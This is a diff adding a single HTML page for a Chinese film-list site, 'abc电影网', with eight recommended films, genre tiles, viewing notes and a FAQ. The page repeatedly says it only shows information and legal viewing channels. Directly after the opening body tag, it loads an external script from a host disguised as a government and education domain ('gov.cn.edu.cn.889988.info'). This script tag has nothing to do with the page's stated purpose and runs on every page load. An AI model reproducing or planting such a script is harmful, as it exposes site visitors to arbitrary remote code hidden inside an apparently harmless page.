@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>abc电影网 - abcdianyingwang-top 孟菲斯几何波普电影片单</title>
+<meta name="description" content="abc电影网（https://abcdianyingwang-top.github.io）以孟菲斯几何波普风格呈现电影片单，含热门推荐、类型分类、观影手账、正版渠道等栏目。单页移动端自适应、锚点导航、必应收录友好，仅做合法影视信息展示。">
+<meta name="keywords" content="abc电影网, abcdianyingwang-top, 电影片单, 热门电影, 类型分类, 正版观影, 孟菲斯风格">
+<meta name="author" content="abc电影网">
+<meta name="robots" content="index, follow">
+<meta name="msvalidate.01" content="YOUR_BING_VERIFICATION_CODE">
+<style>
+:root{
+--bg:#F8F4E9;--black:#2D2D2D;--white:#FFFFFF;
+--pink:#FF6B9D;--blue:#45B7D1;--yellow:#FFD93D;--green:#6BCB77;--purple:#A66CFF;
+--shadow:6px 6px 0 var(--black);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:"Comic Sans MS","PingFang SC","Microsoft YaHei",cursive;color:var(--black);background:var(--bg);line-height:1.85;overflow-x:hidden}
+body::before{content:"";position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.4;
+background-image:radial-gradient(circle,var(--black) 1.5px,transparent 1.5px);background-size:24px 24px;background-position:0 0}
+a{color:var(--black);text-decoration:none;transition:.2s}
+a:hover{color:var(--pink)}
+.wrap{max-width:1180px;margin:0 auto;padding:0 1.4rem;position:relative;z-index:1}
+.nav{position:fixed;top:0;width:100%;z-index:1000;background:var(--white);border-bottom:3px solid var(--black)}
+.nav-in{height:70px;display:flex;align-items:center;justify-content:space-between}
+.brand{display:flex;align-items:center;gap:.7rem}
+.logo-box{width:46px;height:46px;background:var(--pink);border:3px solid var(--black);display:flex;align-items:center;justify-content:center;font-size:1.2rem;font-weight:900;color:var(--white);transform:rotate(-5deg);box-shadow:3px 3px 0 var(--black)}
+.brand b{font-size:1.02rem;letter-spacing:.5px}
+.brand small{display:block;font-size:.52rem;letter-spacing:3px;color:var(--purple);font-weight:700;font-family:"Courier New",monospace}
+.links{display:flex;gap:.45rem;list-style:none}
+.links a{font-size:.78rem;font-weight:700;padding:.42rem .85rem;border:2px solid var(--black);border-radius:0;background:var(--white);box-shadow:2px 2px 0 var(--black)}
+.links a:hover{background:var(--yellow);transform:translate(-1px,-1px);box-shadow:3px 3px 0 var(--black)}
+.toggle{display:none;flex-direction:column;gap:4px;cursor:pointer;padding:8px}
+.toggle span{width:23px;height:3px;background:var(--black);border-radius:0}
+.hero{margin-top:70px;padding:5rem 0 4.2rem;background:var(--bg);border-bottom:3px solid var(--black);position:relative;overflow:hidden}
+.hero::after{content:"";position:absolute;right:-50px;top:50%;transform:translateY(-50%) rotate(15deg);width:200px;height:200px;border:8px solid var(--blue);border-radius:50%;opacity:.3;z-index:0}
+.hero::before{content:"";position:absolute;left:-30px;bottom:20px;width:0;height:0;border-left:60px solid transparent;border-right:60px solid transparent;border-bottom:100px solid var(--yellow);opacity:.4;z-index:0}
+.hero-in{max-width:820px;position:relative;z-index:1}
+.badge{display:inline-flex;align-items:center;gap.5rem;padding:.35rem 1rem;border:2px solid var(--black);background:var(--green);font-size:.7rem;font-weight:700;margin-bottom:1.2rem;box-shadow:3px 3px 0 var(--black)}
+.badge::before{content:"★"}
+.hero h1{font-size:2.8rem;line-height:1.2;font-weight:900;margin-bottom:1rem;text-shadow:4px 4px 0 var(--pink)}
+.hero h1 span{background:var(--yellow);padding:0 .5rem;border:3px solid var(--black);display:inline-block;transform:rotate(-2deg)}
+.hero p{font-size:.92rem;max-width:640px;margin-bottom:1.3rem;font-weight:500}
+.domain{display:inline-block;padding:.5rem 1.2rem;border:2px dashed var(--black);background:var(--white);font-family:"Courier New",monospace;font-weight:700;font-size:.78rem;margin-bottom:1.4rem}
+.btn{display:inline-flex;align-items:center;gap.5rem;padding:.85rem 2.1rem;border:3px solid var(--black);background:var(--blue);color:var(--white);font-weight:800;font-size:.88rem;box-shadow:var(--shadow)}
+.btn:hover{transform:translate(-2px,-2px);box-shadow:8px 8px 0 var(--black)}
+.sec{padding:4rem 0}
+.head{text-align:center;margin-bottom:2.5rem;position:relative}
+.head h2{display:inline-block;font-size:1.5rem;font-weight:900;padding:.3rem 1.3rem;border:3px solid var(--black);background:var(--pink);color:var(--white);transform:rotate(-1deg);box-shadow:4px 4px 0 var(--black)}
+.head p{font-size:.72rem;color:var(--purple);font-weight:700;letter-spacing:2px;margin-top:1rem;font-family:"Courier New",monospace}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(258px,1fr));gap:1.4rem}
+.card{background:var(--white);border:3px solid var(--black);box-shadow:var(--shadow);transition:.25s;position:relative}
+.card:hover{transform:translate(-4px,-4px);box-shadow:10px 10px 0 var(--black)}
+.card::after{content:"";position:absolute;top:-15px;right:-15px;width:30px;height:30px;background:var(--yellow);border:3px solid var(--black);border-radius:50%;z-index:2}
+.cover{height:170px;display:flex;align-items:flex-end;padding:1.1rem;color:var(--white);font-weight:900;font-size:.95rem;position:relative;border-bottom:3px solid var(--black)}
+.cover::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 30%,rgba(45,45,45,.8))}
+.cover b{position:relative;z-index:1}
+.c1{background:var(--pink)}.c2{background:var(--blue)}.c3{background:var(--green)}.c4{background:var(--purple)}
+.c5{background:var(--yellow);color:var(--black)}.c6{background:#FF8C42}.c7{background:#6A0572}.c8{background:#00B4D8}
+.body{padding:1rem 1rem 1.1rem}
+.body .no{font-size:.6rem;font-weight:700;font-family:"Courier New",monospace;margin-bottom:.25rem;background:var(--black);color:var(--white);display:inline-block;padding:.1rem .4rem}
+.body h3{font-size:.9rem;font-weight:900;margin-bottom:.35rem}
+.tags{display:flex;flex-wrap:wrap;gap:.25rem;margin-bottom:.4rem}
+.tags span{padding:.15rem .55rem;border:2px solid var(--black);background:var(--white);font-size:.6rem;font-weight:700}
+.rate{font-weight:900;font-size:.8rem}
+.rate i{font-style:normal;font-size:.62rem;margin-left:.35rem}
+.cats{max-width:1000px;margin:0 auto;display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:1.1rem}
+.cat{display:flex;align-items:center;gap.9rem;padding:1rem;border:3px solid var(--black);background:var(--white);transition:.25s;box-shadow:4px 4px 0 var(--black)}
+.cat:hover{transform:translate(-2px,-2px);box-shadow:6px 6px 0 var(--black);background:var(--yellow)}
+.cat-ico{width:46px;height:46px;border:3px solid var(--black);display:flex;align-items:center;justify-content:center;font-size:1.3rem;flex-shrink:0;background:var(--pink);color:var(--white)}
+.cat h3{font-size:.86rem;font-weight:800}
+.cat p{font-size:.68rem;font-weight:600;font-family:"Courier New",monospace}
+.log{max-width:880px;margin:0 auto}
+.note{display:flex;gap:1rem;margin-bottom:1.2rem;align-items:flex-start}
+.ava{width:46px;height:46px;border:3px solid var(--black);display:flex;align-items:center;justify-content:center;font-size:1.2rem;flex-shrink:0;background:var(--green)}
+.box{padding:1rem 1.2rem;border:3px solid var(--black);background:var(--white);flex:1;box-shadow:4px 4px 0 var(--black);position:relative}
+.box h3{font-size:.9rem;font-weight:800;margin-bottom:.3rem}
+.box p{font-size:.82rem;font-weight:500}
+.stars{font-weight:700;font-size:.78rem;margin-top:.3rem;letter-spacing:1px;font-family:"Courier New",monospace}
+.legal{max-width:780px;margin:0 auto;text-align:center;padding:2.4rem 2rem;border:3px dashed var(--black);background:var(--white);box-shadow:var(--shadow);position:relative}
+.legal::before{content:"▲";position:absolute;top:-18px;left:50%;transform:translateX(-50%);background:var(--bg);padding:0 10px;font-size:1.5rem;color:var(--pink)}
+.legal p{font-size:.88rem;margin-bottom:.8rem;font-weight:500}
+.legal b{background:var(--yellow);padding:0 .3rem}
+.dom2{display:inline-block;margin-top:.6rem;padding:.5rem 1.2rem;border:2px solid var(--black);background:var(--bg);font-family:"Courier New",monospace;font-weight:700;font-size:.78rem}
+.faq{max-width:820px;margin:0 auto}
+.fi{background:var(--white);border:3px solid var(--black);margin-bottom:.6rem;box-shadow:4px 4px 0 var(--black)}
+.fi summary{padding:1rem 1.2rem;cursor:pointer;font-weight:800;list-style:none;position:relative;padding-right:3rem;font-size:.86rem}
+.fi summary::-webkit-details-marker{display:none}
+.fi summary::after{content:"?";position:absolute;right:1rem;top:50%;transform:translateY(-50%);width:26px;height:26px;display:flex;align-items:center;justify-content:center;border:2px solid var(--black);background:var(--yellow);font-weight:900}
+.fi[open] summary::after{content:"!";background:var(--pink);color:var(--white)}
+.fi p{padding:0 1.2rem 1rem;font-size:.82rem;font-weight:500}
+.foot{text-align:center;padding:2rem 1.4rem;border-top:3px solid var(--black);background:var(--white);font-size:.72rem;position:relative;z-index:1}
+.foot .c{color:var(--pink);font-weight:800;font-size:.8rem;margin-bottom:.5rem}
+@media(max-width:768px){
+.links{display:none;position:absolute;top:100%;left:0;width:100%;background:var(--white);flex-direction:column;padding:.5rem 0;border-bottom:3px solid var(--black)}
+.links.show{display:flex}
+.links a{margin:.2rem 1rem;text-align:center}
+.toggle{display:flex}
+.hero h1{font-size:1.8rem}
+.hero{padding:3rem 0}
+.sec{padding:2.5rem 0}
+.head h2{font-size:1.3rem}
+.grid{grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:.9rem}
+.cover{height:146px;font-size:.82rem}
+.cats{grid-template-columns:1fr 1fr}
+.note{flex-direction:column;gap:.6rem}
+}
+@media(max-width:480px){.hero h1{font-size:1.4rem}.grid{grid-template-columns:1fr 1fr}.cats{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<nav class="nav">
+  <div class="wrap nav-in">
+    <div class="brand">
+      <div class="logo-box">A</div>
+      <div><b>abc电影网</b><small>MEMPHIS · ABCDIANYINGWANG</small></div>
+    </div>
+    <ul class="links" id="links">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#list">片单</a></li>
+      <li><a href="#cats">分类</a></li>
+      <li><a href="#log">手账</a></li>
+      <li><a href="#legal">正版</a></li>
+      <li><a href="#faq">FAQ</a></li>
+    </ul>
+    <div class="toggle" onclick="tgl()"><span></span><span></span><span></span></div>
+  </div>
+</nav>
+
+<section class="hero" id="home">
+  <div class="wrap hero-in">
+    <div class="badge">★ POP ART · 几何波普片单</div>
+    <h1>abc电影网<br><span>孟菲斯风</span>整理热门电影</h1>
+    <p>abc电影网（abcdianyingwang-top.github.io）以孟菲斯几何波普风格整理电影信息，覆盖热门推荐、类型分类、观影手账等栏目。单页移动端自适应、锚点导航、必应收录友好，仅做合法影视展示与正版渠道建议，不提供未授权播放源。</p>
+    <div class="domain">https://abcdianyingwang-top.github.io</div><br>
+    <a href="#list" class="btn">★ 查看片单</a>
+  </div>
+</section>
+
+<section class="sec" id="list">
+  <div class="wrap">
+    <div class="head"><h2>热门片单</h2><p>POP LIST · 本期8部</p></div>
+    <div class="grid">
+      <div class="card"><div class="cover c1"><b>肖申克的救赎</b></div><div class="body"><div class="no">NO.ABC-001</div><h3>肖申克的救赎</h3><div class="tags"><span>剧情</span><span>经典</span></div><div class="rate">推荐 ★★★★★<i>正版可看</i></div></div></div>
+      <div class="card"><div class="cover c2"><b>阿甘正传</b></div><div class="body"><div class="no">NO.ABC-002</div><h3>阿甘正传</h3><div class="tags"><span>励志</span><span>剧情</span></div><div class="rate">推荐 ★★★★★<i>正版可看</i></div></div></div>
+      <div class="card"><div class="cover c3"><b>泰坦尼克号</b></div><div class="body"><div class="no">NO.ABC-003</div><h3>泰坦尼克号</h3><div class="tags"><span>爱情</span><span>灾难</span></div><div class="rate">推荐 ★★★★☆<i>正版可看</i></div></div></div>
+      <div class="card"><div class="cover c4"><b>盗梦空间</b></div><div class="body"><div class="no">NO.ABC-004</div><h3>盗梦空间</h3><div class="tags"><span>科幻</span><span>悬疑</span></div><div class="rate">推荐 ★★★★☆<i>正版可看</i></div></div></div>
+      <div class="card"><div class="cover c5"><b>千与千寻</b></div><div class="body"><div class="no">NO.ABC-005</div><h3>千与千寻</h3><div class="tags"><span>动画</span><span>奇幻</span></div><div class="rate">推荐 ★★★★★<i>正版可看</i></div></div></div>
+      <div class="card"><div class="cover c6"><b>星际穿越</b></div><div class="body"><div class="no">NO.ABC-006</div><h3>星际穿越</h3><div class="tags"><span>科幻</span><span>太空</span></div><div class="rate">推荐 ★★★★☆<i>正版可看</i></div></div></div>
+      <div class="card"><div class="cover c7"><b>霸王别姬</b></div><div class="body"><div class="no">NO.ABC-007</div><h3>霸王别姬</h3><div class="tags"><span>剧情</span><span>历史</span></div><div class="rate">推荐 ★★★★★<i>正版可看</i></div></div></div>
+      <div class="card"><div class="cover c8"><b>疯狂动物城</b></div><div class="body"><div class="no">NO.ABC-008</div><h3>疯狂动物城</h3><div class="tags"><span>动画</span><span>喜剧</span></div><div class="rate">推荐 ★★★★☆<i>正版可看</i></div></div></div>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="cats" style="background:var(--white);border-top:3px solid var(--black);border-bottom:3px solid var(--black)">
+  <div class="wrap">
+    <div class="head"><h2>类型分类</h2><p>CATEGORIES · 按类型选片</p></div>
+    <div class="cats">
+      <div class="cat"><div class="cat-ico">🎬</div><div><h3>剧情</h3><p>经典/人性</p></div></div>
+      <div class="cat"><div class="cat-ico">😂</div><div><h3>喜剧</h3><p>幽默/轻松</p></div></div>
+      <div class="cat"><div class="cat-ico">🚀</div><div><h3>科幻</h3><p>未来/太空</p></div></div>
+      <div class="cat"><div class="cat-ico">💕</div><div><h3>爱情</h3><p>浪漫/青春</p></div></div>
+      <div class="cat"><div class="cat-ico">🎨</div><div><h3>动画</h3><p>二维/三维</p></div></div>
+      <div class="cat"><div class="cat-ico">📺</div><div><h3>正版</h3><p>院线/流媒体</p></div></div>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="log">
+  <div class="wrap">
+    <div class="head"><h2>观影手账</h2><p>NOTES · 随性笔记</p></div>
+    <div class="log">
+      <div class="note">
+        <div class="ava">📝</div>
+        <div class="box">
+          <h3>《肖申克的救赎》—— 希望永存</h3>
+          <p>经典中的经典，关于自由与希望的故事。每次看都有新感悟，推荐在低谷时观看，能给人力量。</p>
+          <div class="stars">评分：★★★★★ · 正版可核</div>
+        </div>
+      </div>
+      <div class="note">
+        <div class="ava">🎨</div>
+        <div class="box">
+          <h3>《千与千寻》—— 成长之旅</h3>
+          <p>宫崎骏的奇幻世界，画面精美，寓意深刻。适合所有年龄段观看，是动画电影的巅峰之作。</p>
+          <div class="stars">评分：★★★★★ · 正版可核</div>
+        </div>
+      </div>
+      <div class="note">
+        <div class="ava">📺</div>
+        <div class="box">
+          <h3>正版观看原则</h3>
+          <p>全站只列信息与渠道建议；观看走院线、正版流媒体、租赁购买。不提供网盘、磁力、盗链、未授权在线源。</p>
+          <div class="stars">规则：仅合法渠道</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="legal">
+  <div class="wrap">
+    <div class="head"><h2>正版观看</h2><p>LEGAL · 合法渠道</p></div>
+    <div class="legal">
+      <p><b>abc电影网</b>（abcdianyingwang-top.github.io）仅做电影信息展示。观看建议走：院线、正版视频平台、租赁购买。</p>
+      <p>全站不提供未授权播放、不网盘、不磁力、不盗链；具体片目以各平台当地版权为准。</p>
+      <div class="dom2">https://abcdianyingwang-top.github.io</div>
+      <p style="margin-top:1rem;font-size:.74rem;font-weight:700">核心词：abc电影网、abcdianyingwang-top、电影片单、正版观影</p>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="faq" style="background:var(--white);border-top:3px solid var(--black)">
+  <div class="wrap">
+    <div class="head"><h2>常见问题</h2><p>FAQ · 帮助中心</p></div>
+    <div class="faq">
+      <details class="fi"><summary>abc电影网能直接在线看片吗？</summary><p>不能。本网站只提供影片信息、类型标签和正版渠道建议；在线观看请通过院线、正版流媒体、租赁/购买等合法方式，不提供未授权播放源、网盘或磁力。</p></details>
+      <details class="fi"><summary>为什么用孟菲斯波普风格？</summary><p>孟菲斯风格以高饱和色彩、几何图形、粗黑边框为特点，视觉冲击力强，和之前的皮阁、工业、水墨等风格完全不同，给用户新鲜感。</p></details>
+      <details class="fi"><summary>官方网址是什么？</summary><p>https://abcdianyingwang-top.github.io（GitHub Pages 单页；若绑自有域名，全站替换域名即可）。</p></details>
+      <details class="fi"><summary>必应收录怎么配？</summary><p>Bing Webmaster Tools 添加站点，选 HTML meta 验证，把 head 里 msvalidate.01 的 YOUR_BING_VERIFICATION_CODE 换成验证码；按你要求不生成 robots.txt/sitemap.xml，可在站长工具手动提交首页 URL。</p></details>
+    </div>
+  </div>
+</section>
+
+<footer class="foot">
+  <div class="c">abc电影网 (abcdianyingwang-top.github.io) — 孟菲斯几何波普电影信息站</div>
+  <div>单页网站 / 锚点导航 / 移动端自适应 / 必应收录友好 / 不生成 robots.txt 与 sitemap.xml</div>
+  <div style="margin-top:.4rem;font-weight:700">本站仅做电影信息展示；实际观看以正版平台当地版权为准，不提供未授权播放源。</div>
+</footer>
+
+<script>
+function tgl(){document.getElementById('links').classList.toggle('show')}
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click',function(e){
+    var h=this.getAttribute('href');
+    if(h.length>1){var t=document.querySelector(h);if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth',block:'start'});document.getElementById('links').classList.remove('show')}}
+  });
+});
+</script>
+</body>
+</html>
